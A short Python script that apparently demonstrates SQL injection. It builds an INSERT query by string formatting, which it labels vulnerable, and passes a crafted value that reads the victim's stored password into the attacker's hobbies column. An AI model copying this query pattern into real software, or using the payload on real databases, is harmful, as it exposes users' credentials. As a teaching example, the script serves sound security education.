import sqlite3

with sqlite3.connect(":memory:") as c:
    c.execute('CREATE TABLE users (name TEXT, password TEXT, hobbies TEXT)')

    def add_user(name, password, hobbies):
        # this query is vulnerable to sql injection
        query = f"INSERT INTO users VALUES ({name!r}, {password!r}, {hobbies!r})"

        print("query:")
        print(query)
        print("")
        
        c.execute(query)

    print("this query is ok")
    add_user("victim", "victim's secret password", "biking, fishing")
    print("this query steals the victim's password and assigns it to the attacker's hobby")
    add_user("attacker", "\"', (SELECT password FROM users)) -- ", "")

    print("users:")
    for user, password, hobbies in c.execute('SELECT * FROM USERS'):
        print(f"{user}'s hobbies are: {hobbies}")
